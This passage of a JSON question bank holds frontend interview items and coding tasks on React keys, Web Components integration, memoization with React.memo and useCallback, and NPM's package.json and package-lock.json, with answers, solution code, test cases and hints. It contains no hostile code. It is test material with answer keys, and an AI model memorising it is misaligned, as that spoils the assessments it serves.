          "evaluationCriteria": [
            "Understanding of key stability requirements.",
            "Ability to explain the negative consequences of unstable keys.",
            "Ability to propose correct and robust solutions for key generation."
          ],
          "example": "```jsx\n// Bad example: Do NOT do this!\nfunction ChatMessage({ message }) {\n  return <li key={Math.random()}>{message.text}</li>; // Key changes on every render\n}\n\n// Good example:\nfunction ChatMessage({ message }) {\n  return <li key={message.id}>{message.text}</li>; // Stable, unique ID\n}\n```\nUsing `Math.random()` as a key forces React to re-render the entire `li` element and its children every single time the `ChatMessage` component's parent re-renders, even if the message content hasn't changed. This negates all benefits of React's Virtual DOM reconciliation.",
          "tags": [
            "React",
            "Keys",
            "Performance",
            "Anti-pattern",
            "Open-Ended"
          ],
          "prerequisites": [
            "react_lists",
            "react_virtual_dom"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_components_in_react_1",
          "topic": "Web Components in React",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following is NOT a primary benefit of using Web Components within a React application?",
          "answer": "They automatically share React's component state management.",
          "options": [
            "They provide strong encapsulation of styles and markup using Shadow DOM.",
            "They can be reused across different JavaScript frameworks or without any framework.",
            "They are based on web standards, ensuring long-term compatibility.",
            "They automatically share React's component state management."
          ],
          "analysisPoints": [
            "Web Components provide encapsulation, reusability, and are standard-based, as explicitly stated in the theory.",
            "Web Components are framework-agnostic. They do not automatically integrate with or share React's specific state management (like `useState`, `useReducer`, or Context API). They have their own internal state, and communication with React components typically happens via props (attributes) and custom DOM events."
          ],
          "keyConcepts": [
            "Web Components",
            "React",
            "Encapsulation",
            "Reusability",
            "Framework Agnostic",
            "Standard-based",
            "State Management"
          ],
          "evaluationCriteria": [
            "Understanding of the core benefits of Web Components.",
            "Ability to identify common misconceptions about Web Component integration with frameworks."
          ],
          "example": "Web Components exist independently of React. While you can pass data to them as attributes or properties, and listen for their custom events, they manage their own internal state using their own mechanisms, not React's. For a Web Component to interact with React's state, you would typically pass a callback from React that updates React's state based on an event dispatched by the Web Component.",
          "tags": [
            "Web Components",
            "React",
            "MCQ",
            "Interoperability"
          ],
          "prerequisites": [
            "web_components_basics",
            "react_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_components_in_react_2",
          "topic": "Web Components in React",
          "level": "hard",
          "type": "open",
          "question": "You've integrated a custom Web Component `<my-custom-slider>` into your React application. This slider dispatches a custom event `slider-value-changed` when its value changes, with the new value in `event.detail.value`. How would you typically handle this event in a React functional component to update React's state?",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Recognize that React's synthetic event system might not capture custom DOM events from Shadow DOM directly.",
            "The standard approach is to use `useRef` to get a direct reference to the DOM element where the Web Component is rendered.",
            "Attach an event listener using `addEventListener` to this DOM element within a `useEffect` hook.",
            "Ensure the `useEffect` cleanup function removes the event listener to prevent memory leaks.",
            "Inside the event listener, access `event.detail.value` and update the React component's state using `useState` or `useReducer`."
          ],
          "keyConcepts": [
            "Web Components",
            "React Hooks",
            "useRef",
            "useEffect",
            "Event Handling",
            "Custom Events",
            "Shadow DOM",
            "Interoperability"
          ],
          "evaluationCriteria": [
            "Knowledge of `useRef` and `useEffect` for direct DOM interaction.",
            "Understanding of Web Component event mechanisms (custom events, `event.detail`).",
            "Ability to correctly implement event listener setup and cleanup in React hooks.",
            "Problem-solving for interoperability challenges."
          ],
          "example": "```typescript\nimport React, { useRef, useEffect, useState } from 'react';\n\n// Assume this is your actual Web Component definition (e.g., in a separate file)\n// Or it's a globally registered component imported earlier\n// class MyCustomSlider extends HTMLElement {\n//   constructor() {\n//     super();\n//     const shadowRoot = this.attachShadow({ mode: 'open' });\n//     shadowRoot.innerHTML = `<input type=\"range\" min=\"0\" max=\"100\" value=\"0\">`;\n//     const input = shadowRoot.querySelector('input');\n//     input.addEventListener('input', (e) => {\n//       const event = new CustomEvent('slider-value-changed', {\n//         detail: { value: (e.target as HTMLInputElement).value },\n//         bubbles: true, // important for events to bubble up\n//         composed: true // important for events to cross shadow DOM boundaries\n//       });\n//       this.dispatchEvent(event);\n//     });\n//   }\n// }\n// customElements.define('my-custom-slider', MyCustomSlider);\n\nfunction SliderControl() {\n  const sliderRef = useRef<any>(null); // Ref to the Web Component DOM element\n  const [sliderValue, setSliderValue] = useState(0);\n\n  useEffect(() => {\n    const currentSlider = sliderRef.current;\n\n    if (currentSlider) {\n      const handleValueChange = (event: Event) => {\n        // Type assertion for CustomEvent to access detail\n        const customEvent = event as CustomEvent;\n        console.log('Web Component value changed:', customEvent.detail.value);\n        setSliderValue(parseInt(customEvent.detail.value, 10));\n      };\n\n      // Attach the native DOM event listener\n      currentSlider.addEventListener('slider-value-changed', handleValueChange);\n\n      // Cleanup function to remove the event listener\n      return () => {\n        currentSlider.removeEventListener('slider-value-changed', handleValueChange);\n      };\n    }\n  }, []); // Empty dependency array means this effect runs once on mount\n\n  return (\n    <div>\n      <h2>Web Component Slider Example</h2>\n      <my-custom-slider ref={sliderRef} initial-value=\"50\"></my-custom-slider>\n      <p>Current Slider Value (React State): {sliderValue}</p>\n    </div>\n  );\n}\n```\nThis example uses `useRef` to get a direct reference to the `<my-custom-slider>` DOM element. A `useEffect` hook then attaches an `addEventListener` to this native element for the `slider-value-changed` custom event. The `handleValueChange` function extracts the value from `event.detail.value` and updates the React component's `sliderValue` state. The cleanup function ensures the event listener is removed when the component unmounts.",
          "tags": [
            "Web Components",
            "React",
            "Event Handling",
            "useRef",
            "useEffect",
            "Custom Events",
            "Open-Ended"
          ],
          "prerequisites": [
            "react_hooks",
            "dom_events",
            "web_components_basics"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_javascript_build_tools_npm_1",
          "topic": "JavaScript Build Tools and Workflow: NPM",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary role of `package.json` in a Node.js/JavaScript project?",
          "answer": "It serves as the manifest for the project, storing metadata, defining scripts, and listing all project dependencies and devDependencies.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "package.json",
            "NPM",
            "Project Metadata",
            "Dependencies"
          ],
          "evaluationCriteria": [],
          "example": null,
          "tags": [
            "NPM",
            "package.json",
            "Flashcard",
            "Build Tools"
          ],
          "prerequisites": [
            "node_js_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_javascript_build_tools_npm_2",
          "topic": "JavaScript Build Tools and Workflow: NPM",
          "level": "medium",
          "type": "mcq",
          "question": "You've cloned a new frontend project from a Git repository. Which NPM command would you typically run first to get the project set up and ready for development?",
          "answer": "`npm install`",
          "options": [
            "`npm init`",
            "`npm start`",
            "`npm install`",
            "`npm update`"
          ],
          "analysisPoints": [
            "`npm install` reads the `package.json` and `package-lock.json` files and installs all listed dependencies into the `node_modules` directory.",
            "`npm init` initializes a *new* project, which is not what you do when cloning an existing one.",
            "`npm start` runs a script, but dependencies must be installed first.",
            "`npm update` updates *existing* packages, which implies they are already installed."
          ],
          "keyConcepts": [
            "NPM Commands",
            "Project Setup",
            "Dependencies",
            "package.json"
          ],
          "evaluationCriteria": [
            "Understanding of common NPM workflow for project setup.",
            "Knowledge of `npm install`'s purpose."
          ],
          "example": "When you clone a repository, the `node_modules` folder (where packages are stored) is usually not committed to Git. The `package.json` file, however, *is* committed, containing a list of all required packages. Running `npm install` (without any package name) tells NPM to read `package.json` and `package-lock.json` and download/install all those specified dependencies, making the project's code runnable.",
          "tags": [
            "NPM",
            "CLI",
            "Project Workflow",
            "MCQ"
          ],
          "prerequisites": [
            "command_line_basics"
          ],
          "complexity": 4,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_javascript_build_tools_npm_3",
          "topic": "JavaScript Build Tools and Workflow: NPM",
          "level": "medium",
          "type": "open",
          "question": "What is the purpose of `package-lock.json` and why is it important in a team development environment?",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Purpose: `package-lock.json` records the *exact* versions of every installed package, including transitive dependencies, along with their checksums and sources.",
            "Importance in team environment: It ensures that every developer (and CI/CD pipeline) installing the project's dependencies will get the *identical* dependency tree. This guarantees consistent builds and prevents 'it works on my machine' issues caused by subtle differences in dependency versions that might occur if only `package.json` (with its semantic version ranges) were used."
          ],
          "keyConcepts": [
            "package-lock.json",
            "package.json",
            "Dependency Management",
            "Reproducible Builds",
            "Semantic Versioning",
            "Team Collaboration"
          ],
          "evaluationCriteria": [
            "Clear distinction between `package.json` and `package-lock.json`.",
            "Understanding of the problem `package-lock.json` solves (version drift, inconsistent environments).",
            "Ability to explain its role in collaborative development."
          ],
          "example": "Imagine `package.json` specifies `\"react\": \"^18.0.0\"`. This means any React version from 18.0.0 up to (but not including) 19.0.0 is acceptable. If a new `18.2.0` is released, one developer might install `18.0.0` while another installs `18.2.0`, potentially leading to different behavior. `package-lock.json` pins the exact version (e.g., `18.0.0` or `18.2.0`) along with all its sub-dependencies, ensuring that `npm install` always yields the exact same dependency graph, regardless of when it's run.",
          "tags": [
            "NPM",
            "package-lock.json",
            "Dependencies",
            "Collaboration",
            "Open-Ended"
          ],
          "prerequisites": [
            "semantic_versioning",
            "package_json"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_react_memoization_1",
          "title": "Build a Performance-Optimized Product List",
          "description": "\nImplement a React application that displays a list of products. The application should include:\n\n1.  A `ProductList` component that receives an array of products.\n2.  A `ProductCard` component for each product, displaying its name, price, and a button to add it to a cart.\n3.  A `ShoppingCart` component that displays the total number of items in the cart.\n4.  A 'Refresh Products' button in the `App` component that randomly updates a property (e.g., `lastUpdated` timestamp) on some products, simulating data changes that don't always affect core product display info (name, price).\n\n**Optimization Requirements:**\n*   `ProductCard` should only re-render if its `product`'s `id`, `name`, or `price` changes, or if the `onAddToCart` callback changes. It should NOT re-render if only the `lastUpdated` timestamp on the product object changes or if other products in the list change.\n*   The `onAddToCart` callback passed to `ProductCard` must be memoized to prevent unnecessary re-renders of `ProductCard` when the parent component re-renders (e.g., due to `ShoppingCart` updates).\n*   The `ShoppingCart` component should only re-render if the `totalItems` count changes.\n\nYour solution should use `React.memo` and `useCallback` effectively to meet these performance goals. Include console logs in `ProductCard` and `ShoppingCart` to demonstrate when they re-render.\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\ninterface Product {\n  id: number;\n  name: string;\n  price: number;\n  lastUpdated: number; // This property can change often\n}\n\ninterface ProductCardProps {\n  product: Product;\n  onAddToCart: (productId: number) => void;\n}\n\n// TODO: Optimize ProductCard\nfunction ProductCard({ product, onAddToCart }: ProductCardProps) {\n  console.log(`Rendering ProductCard: ${product.name}`);\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '10px', margin: '10px', width: '200px' }}>\n      <h3>{product.name}</h3>\n      <p>Price: ${product.price.toFixed(2)}</p>\n      <button onClick={() => onAddToCart(product.id)}>Add to Cart</button>\n    </div>\n  );\n}\n\ninterface ProductListProps {\n  products: Product[];\n  onAddToCart: (productId: number) => void;\n}\n\nfunction ProductList({ products, onAddToCart }: ProductListProps) {\n  return (\n    <div style={{ display: 'flex', flexWrap: 'wrap' }}>\n      {products.map(product => (\n        <ProductCard key={product.id} product={product} onAddToCart={onAddToCart} />\n      ))}\n    </div>\n  );\n}\n\ninterface ShoppingCartProps {\n  totalItems: number;\n}\n\n// TODO: Optimize ShoppingCart\nfunction ShoppingCart({ totalItems }: ShoppingCartProps) {\n  console.log('Rendering ShoppingCart');\n  return (\n    <div style={{ border: '1px solid green', padding: '10px', margin: '10px' }}>\n      <h2>Shopping Cart</h2>\n      <p>Total Items: {totalItems}</p>\n    </div>\n  );\n}\n\nexport default function App() {\n  const [products, setProducts] = useState<Product[]>([\n    { id: 1, name: 'Laptop', price: 1200, lastUpdated: Date.now() },\n    { id: 2, name: 'Mouse', price: 25, lastUpdated: Date.now() },\n    { id: 3, name: 'Keyboard', price: 75, lastUpdated: Date.now() },\n  ]);\n  const [cartItems, setCartItems] = useState<number>(0);\n\n  const handleAddToCart = (productId: number) => {\n    setCartItems(prev => prev + 1);\n    console.log(`Added product ${productId} to cart.`);\n  };\n\n  const refreshProducts = () => {\n    // Simulate updating some products (e.g., a timestamp)\n    setProducts(prevProducts => prevProducts.map(p => \n      p.id === 1 ? { ...p, lastUpdated: Date.now() } : p\n    ));\n  };\n\n  return (\n    <div>\n      <h1>Our Store</h1>\n      <button onClick={refreshProducts}>Refresh Products</button>\n      <ShoppingCart totalItems={cartItems} />\n      <ProductList products={products} onAddToCart={handleAddToCart} />\n    </div>\n  );\n}\n",
          "solutionCode": "import React, { useState, useCallback } from 'react';\n\ninterface Product {\n  id: number;\n  name: string;\n  price: number;\n  lastUpdated: number; // This property can change often\n}\n\ninterface ProductCardProps {\n  product: Product;\n  onAddToCart: (productId: number) => void;\n}\n\n// Optimized ProductCard with custom comparison\nconst ProductCard = React.memo(function ProductCard({ product, onAddToCart }: ProductCardProps) {\n  console.log(`Rendering ProductCard: ${product.name}`);\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '10px', margin: '10px', width: '200px' }}>\n      <h3>{product.name}</h3>\n      <p>Price: ${product.price.toFixed(2)}</p>\n      <button onClick={() => onAddToCart(product.id)}>Add to Cart</button>\n    </div>\n  );\n}, (prevProps, nextProps) => {\n  // Only re-render if id, name, price, or onAddToCart reference changes\n  return (\n    prevProps.product.id === nextProps.product.id &&\n    prevProps.product.name === nextProps.product.name &&\n    prevProps.product.price === nextProps.product.price &&\n    prevProps.onAddToCart === nextProps.onAddToCart\n  );\n});\n\ninterface ProductListProps {\n  products: Product[];\n  onAddToCart: (productId: number) => void;\n}\n\nfunction ProductList({ products, onAddToCart }: ProductListProps) {\n  return (\n    <div style={{ display: 'flex', flexWrap: 'wrap' }}>\n      {products.map(product => (\n        <ProductCard key={product.id} product={product} onAddToCart={onAddToCart} />\n      ))}\n    </div>\n  );\n}\n\ninterface ShoppingCartProps {\n  totalItems: number;\n}\n\n// Optimized ShoppingCart with React.memo (default shallow comparison is fine here)\nconst ShoppingCart = React.memo(function ShoppingCart({ totalItems }: ShoppingCartProps) {\n  console.log('Rendering ShoppingCart');\n  return (\n    <div style={{ border: '1px solid green', padding: '10px', margin: '10px' }}>\n      <h2>Shopping Cart</h2>\n      <p>Total Items: {totalItems}</p>\n    </div>\n  );\n});\n\nexport default function App() {\n  const [products, setProducts] = useState<Product[]>([\n    { id: 1, name: 'Laptop', price: 1200, lastUpdated: Date.now() },\n    { id: 2, name: 'Mouse', price: 25, lastUpdated: Date.now() },\n    { id: 3, name: 'Keyboard', price: 75, lastUpdated: Date.now() },\n  ]);\n  const [cartItems, setCartItems] = useState<number>(0);\n\n  // Memoize handleAddToCart using useCallback\n  const handleAddToCart = useCallback((productId: number) => {\n    setCartItems(prev => prev + 1);\n    console.log(`Added product ${productId} to cart.`);\n  }, []); // Empty dependency array as setCartItems is guaranteed stable by React\n\n  const refreshProducts = () => {\n    // Simulate updating some products (e.g., a timestamp)\n    setProducts(prevProducts => prevProducts.map(p => \n      p.id === 1 ? { ...p, lastUpdated: Date.now() } : p\n    ));\n  };\n\n  return (\n    <div>\n      <h1>Our Store</h1>\n      <button onClick={refreshProducts}>Refresh Products</button>\n      <ShoppingCart totalItems={cartItems} />\n      <ProductList products={products} onAddToCart={handleAddToCart} />\n    </div>\n  );\n}\n",
          "testCases": [
            "Initial render: All components (App, ShoppingCart, ProductList, all ProductCards) should render once.",
            "Click 'Add to Cart' on any product: `handleAddToCart` should execute. `App` and `ShoppingCart` should re-render. `ProductCard` components should NOT re-render (because `onAddToCart` is memoized and their `product` props haven't changed the relevant fields).",
            "Click 'Refresh Products': `App` should re-render. The `ProductCard` for the updated product (ID 1) should NOT re-render because its `name` and `price` (and `onAddToCart`) didn't change, only `lastUpdated` which is ignored by the custom comparison. Other `ProductCard`s should also not re-render.",
            "Add a new product to the list (manual test): Only the new `ProductCard` should render. Existing ones should not re-render.",
            "Change price of a product (manual test): Only the `ProductCard` for that specific product should re-render."
          ],
          "hints": [
            "Remember that `React.memo` performs a shallow comparison by default. For objects/arrays, this means comparing references. If an object property changes but the object reference doesn't, or vice-versa, you might need a custom comparison.",
            "Callbacks passed down to memoized children should often be wrapped in `useCallback` to maintain referential equality.",
            "Think about what specific props need to be checked for `ProductCard`'s re-render condition.",
            "The `setCartItems` function provided by `useState` is stable across re-renders, so `useCallback`'s dependency array for `handleAddToCart` can be empty."
          ],
          "tags": [
            "React",
            "Performance",
            "Optimization",
            "useCallback",
            "React.memo",
            "Front-end Architecture"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_functional_components",
            "react_hooks",
            "react_state_props"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "memoization",
            "referential_equality",
            "shallow_comparison",
            "component_re_rendering"
          ]
        },
        {
          "id": "task_virtual_dom_keys_1",
          "title": "Implement a Dynamic Todo List with Proper Keys and Input State",
          "description": "\nCreate a React component for a dynamic todo list. The list should support:\n\n1.  Adding new todos at the top of the list.\n2.  Marking todos as completed (toggling a checkbox).\n3.  Each todo item should have an associated `<input type=\"text\" />` field to add notes.\n\n**Requirements:**\n*   Ensure that when new todos are added to the list, the existing todo items (especially their associated input fields) do not lose their current input values or focus. This implies correct usage of `key` props.\n*   Each todo item must have a unique and stable identifier. If your mock data doesn't provide it, generate one upon creation.\n*   Demonstrate the issue of using array `index` as a key and then provide the correct solution.\n\nYour solution should clearly show the importance of correct key usage in maintaining component state within dynamic lists.\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\ninterface Todo {\n  id: string; // Or number\n  text: string;\n  completed: boolean;\n}\n\nfunction BadTodoItem({ todo, onToggleComplete }: { todo: Todo; onToggleComplete: (id: string) => void }) {\n  console.log(`Rendering TodoItem (Bad Keys): ${todo.text}`);\n  return (\n    <li style={{ textDecoration: todo.completed ? 'line-through' : 'none' }}>\n      <input\n        type=\"checkbox\"\n        checked={todo.completed}\n        onChange={() => onToggleComplete(todo.id)}\n      />\n      {todo.text}\n      <input type=\"text\" placeholder=\"Add notes here\" style={{ marginLeft: '10px' }} />\n    </li>\n  );\n}\n\nexport default function App() {\n  const [todos, setTodos] = useState<Todo[]>([\n    { id: '1', text: 'Learn React Hooks', completed: false },\n    { id: '2', text: 'Master TypeScript', completed: false },\n    { id: '3', text: 'Build a Portfolio', completed: false },\n  ]);\n  const [newTodoText, setNewTodoText] = useState('');\n\n  const handleAddTodo = () => {\n    if (newTodoText.trim() === '') return;\n    const newTodo: Todo = {\n      id: String(Date.now()), // Simple ID generation for now\n      text: newTodoText,\n      completed: false,\n    };\n    setTodos([newTodo, ...todos]); // Add to the beginning\n    setNewTodoText('');\n  };\n\n  const handleToggleComplete = (id: string) => {\n    setTodos(prevTodos =>\n      prevTodos.map(todo =>\n        todo.id === id ? { ...todo, completed: !todo.completed } : todo\n      )\n    );\n  };\n\n  return (\n    <div>\n      <h1>My Todo List (Bad Keys)</h1>\n      <div>\n        <input\n          type=\"text\"\n          value={newTodoText}\n          onChange={(e) => setNewTodoText(e.target.value)}\n          placeholder=\"New todo...\"\n        />\n        <button onClick={handleAddTodo}>Add Todo</button>\n      </div>\n      <ul>\n        {/* TODO: This uses index as key - observe the problem */}\n        {todos.map((todo, index) => (\n          <BadTodoItem key={index} todo={todo} onToggleComplete={handleToggleComplete} />\n        ))}\n      </ul>\n    </div>\n  );\n}\n",
          "solutionCode": "import React, { useState } from 'react';\n\ninterface Todo {\n  id: string;\n  text: string;\n  completed: boolean;\n}\n\n// Correctly implemented TodoItem (no change needed in its internal logic)\nfunction GoodTodoItem({ todo, onToggleComplete }: { todo: Todo; onToggleComplete: (id: string) => void }) {\n  console.log(`Rendering TodoItem (Good Keys): ${todo.text}`);\n  return (\n    <li style={{ textDecoration: todo.completed ? 'line-through' : 'none' }}>\n      <input\n        type=\"checkbox\"\n        checked={todo.completed}\n        onChange={() => onToggleComplete(todo.id)}\n      />\n      {todo.text}\n      <input type=\"text\" placeholder=\"Add notes here\" style={{ marginLeft: '10px' }} />\n    </li>\n  );\n}\n\nexport default function App() {\n  const [todos, setTodos] = useState<Todo[]>([\n    { id: '1', text: 'Learn React Hooks', completed: false },\n    { id: '2', text: 'Master TypeScript', completed: false },\n    { id: '3', text: 'Build a Portfolio', completed: false },\n  ]);\n  const [newTodoText, setNewTodoText] = useState('');\n\n  const handleAddTodo = () => {\n    if (newTodoText.trim() === '') return;\n    const newTodo: Todo = {\n      id: String(Date.now()), // Generating a unique, stable ID\n      text: newTodoText,\n      completed: false,\n    };\n    setTodos([newTodo, ...todos]); // Add to the beginning\n    setNewTodoText('');\n  };\n\n  const handleToggleComplete = (id: string) => {\n    setTodos(prevTodos =>\n      prevTodos.map(todo =>\n        todo.id === id ? { ...todo, completed: !todo.completed } : todo\n      )\n    );\n  };\n\n  return (\n    <div>\n      <h1>My Todo List (Good Keys)</h1>\n      <div>\n        <input\n          type=\"text\"\n          value={newTodoText}\n          onChange={(e) => setNewTodoText(e.target.value)}\n          placeholder=\"New todo...\"\n        />\n        <button onClick={handleAddTodo}>Add Todo</button>\n      </div>\n      <ul>\n        {/* SOLUTION: Use todo.id as key */}\n        {todos.map(todo => (\n          <GoodTodoItem key={todo.id} todo={todo} onToggleComplete={handleToggleComplete} />\n        ))}\n      </ul>\n    </div>\n  );\n}\n",
          "testCases": [
            "Initial render: All three todos should display.",
            "Type notes into the input fields of existing todos.",
            "Add a new todo item: Enter text in the 'New todo...' input and click 'Add Todo'. Observe that the new todo appears at the top. Critically, observe that the notes you typed into the input fields of the *original* todos are preserved.",
            "Toggle completion of a todo: The checkbox should update, and the strikethrough should apply/remove without affecting input field values."
          ],
          "hints": [
            "The problem occurs when an item's position in the array changes, but its `key` (index) remains the same as another item's previous key.",
            "React uses keys to identify unique components in a list. If the key is not stable, React cannot correctly track components and their internal state.",
            "A robust `id` for each todo item is crucial. `Date.now()` is a simple way to generate unique IDs for demo purposes, but in a real application, you might use a UUID library or a backend-generated ID."
          ],
          "tags": [
            "React",
            "Keys",
            "Virtual DOM",
            "List Rendering",
            "State Management",
            "Performance"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "react_lists",
            "react_state"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "reconciliation",
            "component_lifecycle",
            "forms_in_react"
          ]
        },
        {
          "id": "task_web_components_in_react_1",
          "title": "Integrate a Custom Web Component with React for Form Input",
          "description": "\nCreate a React application that integrates a custom Web Component serving as an enhanced text input. The Web Component should:\n\n1.  Be defined as `<my-text-input>`.\n2.  Have an internal `<input type=\"text\">` element.\n3.  Accept a `label` attribute/prop for its label text.\n4.  Dispatch a custom event `input-changed` when its internal input's value changes, with the new value in `event.detail.value`.\n\nYour React application should:\n*   Render an instance of `<my-text-input>`.\n*   Display its value in a React component's state.\n*   Demonstrate how to pass the `label` prop to the Web Component.\n*   Correctly handle the `input-changed` custom event to update the React component's state.\n*   Ensure proper cleanup of event listeners when the React component unmounts.\n\nUse TypeScript for both the Web Component (if defining it in TS) and the React application.\n",
          "difficulty": "hard",
          "startingCode": "import React, { useState, useRef, useEffect } from 'react';\n\n// --- Web Component Definition (for demonstration, assume it's globally available or imported)\n// You can define this in a separate file like 'my-text-input.ts' and import it.\n// For simplicity, we define it here, but typically you'd import it as `import './my-text-input';`\nclass MyTextInput extends HTMLElement {\n  private inputElement: HTMLInputElement;\n  private labelElement: HTMLLabelElement;\n\n  constructor() {\n    super();\n    const shadowRoot = this.attachShadow({ mode: 'open' });\n\n    const wrapper = document.createElement('div');\n    wrapper.style.padding = '10px';\n    wrapper.style.border = '1px solid #ddd';\n    wrapper.style.borderRadius = '5px';\n\n    this.labelElement = document.createElement('label');\n    this.labelElement.style.marginRight = '5px';\n    this.labelElement.style.fontWeight = 'bold';\n\n    this.inputElement = document.createElement('input');\n    this.inputElement.type = 'text';\n    this.inputElement.style.padding = '8px';\n    this.inputElement.style.border = '1px solid #ccc';\n    this.inputElement.style.borderRadius = '3px';\n\n    this.inputElement.addEventListener('input', (e) => {\n      const event = new CustomEvent('input-changed', {\n        detail: { value: (e.target as HTMLInputElement).value },\n        bubbles: true, // Allow event to bubble up through shadow DOM boundary\n        composed: true // Allow event to cross shadow DOM boundary\n      });\n      this.dispatchEvent(event);\n    });\n\n    wrapper.appendChild(this.labelElement);\n    wrapper.appendChild(this.inputElement);\n    shadowRoot.appendChild(wrapper);\n  }\n\n  // Observe changes to the 'label' attribute\n  static get observedAttributes() {\n    return ['label'];\n  }\n\n  attributeChangedCallback(name: string, oldValue: string | null, newValue: string | null) {\n    if (name === 'label') {\n      this.labelElement.textContent = newValue ? newValue + ':' : '';\n    }\n  }\n\n  // Method to set value programmatically if needed (optional for this task)\n  // set value(val: string) {\n  //   this.inputElement.value = val;\n  // }\n  // get value(): string {\n  //   return this.inputElement.value;\n  // }\n}\n\n// Register the custom element if it hasn't been already\nif (!customElements.get('my-text-input')) {\n  customElements.define('my-text-input', MyTextInput);\n}\n\n// --- React Component\nexport default function App() {\n  const [inputValue, setInputValue] = useState('');\n  const inputRef = useRef<HTMLElement>(null); // Ref to hold the Web Component element\n\n  // TODO: Implement useEffect to handle Web Component's custom event\n\n  return (\n    <div>\n      <h1>Web Component Integration</h1>\n      <p>Value from Web Component: <strong>{inputValue}</strong></p>\n\n      {/* TODO: Use the Web Component and pass props/ref */}\n      <my-text-input label=\"Your Name\"></my-text-input>\n    </div>\n  );\n}\n",
          "solutionCode": "import React, { useState, useRef, useEffect } from 'react';\n\n// --- Web Component Definition (for demonstration, assume it's globally available or imported)\nclass MyTextInput extends HTMLElement {\n  private inputElement: HTMLInputElement;\n  private labelElement: HTMLLabelElement;\n\n  constructor() {\n    super();\n    const shadowRoot = this.attachShadow({ mode: 'open' });\n\n    const wrapper = document.createElement('div');\n    wrapper.style.padding = '10px';\n    wrapper.style.border = '1px solid #ddd';\n    wrapper.style.borderRadius = '5px';\n\n    this.labelElement = document.createElement('label');\n    this.labelElement.style.marginRight = '5px';\n    this.labelElement.style.fontWeight = 'bold';\n\n    this.inputElement = document.createElement('input');\n    this.inputElement.type = 'text';\n    this.inputElement.style.padding = '8px';\n    this.inputElement.style.border = '1px solid #ccc';\n    this.inputElement.style.borderRadius = '3px';\n\n    this.inputElement.addEventListener('input', (e) => {\n      const event = new CustomEvent('input-changed', {\n        detail: { value: (e.target as HTMLInputElement).value },\n        bubbles: true,\n        composed: true\n      });\n      this.dispatchEvent(event);\n    });\n\n    wrapper.appendChild(this.labelElement);\n    wrapper.appendChild(this.inputElement);\n    shadowRoot.appendChild(wrapper);\n  }\n\n  static get observedAttributes() {\n    return ['label'];\n  }\n\n  attributeChangedCallback(name: string, oldValue: string | null, newValue: string | null) {\n    if (name === 'label') {\n      this.labelElement.textContent = newValue ? newValue + ':' : '';\n    }\n  }\n}\n\nif (!customElements.get('my-text-input')) {\n  customElements.define('my-text-input', MyTextInput);\n}\n\n// --- React Component\nexport default function App() {\n  const [inputValue, setInputValue] = useState('');\n  const inputRef = useRef<HTMLElement>(null); // Ref to hold the Web Component element\n\n  useEffect(() => {\n    const currentInput = inputRef.current;\n\n    const handleInputChange = (event: Event) => {\n      const customEvent = event as CustomEvent;\n      setInputValue(customEvent.detail.value);\n    };\n\n    if (currentInput) {\n      // Attach the native DOM event listener to the Web Component\n      currentInput.addEventListener('input-changed', handleInputChange);\n    }\n\n    // Cleanup function to remove the event listener when component unmounts\n    return () => {\n      if (currentInput) {\n        currentInput.removeEventListener('input-changed', handleInputChange);\n      }\n    };\n  }, []); // Empty dependency array means this effect runs once on mount and cleans up on unmount\n\n  return (\n    <div>\n      <h1>Web Component Integration</h1>\n      <p>Value from Web Component: <strong>{inputValue}</strong></p>\n\n      {/* Use the Web Component and pass the ref */}\n      <my-text-input label=\"Your Name\" ref={inputRef}></my-text-input>\n    </div>\n  );\n}\n",
          "testCases": [
            "Initial render: The `my-text-input` Web Component should appear with the label 'Your Name:'. The 'Value from Web Component' text should be empty.",
            "Type text into the Web Component's input field: As you type, the 'Value from Web Component' text should update in real-time, reflecting the Web Component's internal value.",
            "Unmount the component (e.g., by navigating away or conditionally rendering it off): Verify that no memory leaks occur from unremoved event listeners (difficult to test directly, but code structure ensures it)."
          ],
          "hints": [
            "Remember that React's synthetic event system doesn't automatically listen for custom DOM events originating from inside a Shadow DOM.",
            "You'll need `useRef` to get a direct reference to the `my-text-input` DOM element.",
            "The `useEffect` hook is the place to attach and clean up manual DOM event listeners.",
            "Pay attention to the `detail` property of the `CustomEvent` to get the value.",
            "Ensure `bubbles: true` and `composed: true` are set when dispatching custom events from the Web Component if you want them to cross Shadow DOM boundaries and bubble up."
          ],
          "tags": [
            "React",
            "Web Components",
            "Interoperability",
            "Hooks",
            "useRef",
            "useEffect",
            "Event Handling",
            "Custom Elements"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "react_functional_components",
            "react_hooks",
            "web_components_basics",
            "dom_events"
          ],
          "complexity": 8,
          "interviewRelevance": 7,
          "learningPath": "advanced",
          "relatedConcepts": [
            "shadow_dom",
            "custom_events",
            "forms_in_react"
          ]
        },
        {
          "id": "task_javascript_build_tools_npm_1",
          "title": "Manage a Small Frontend Project with NPM",
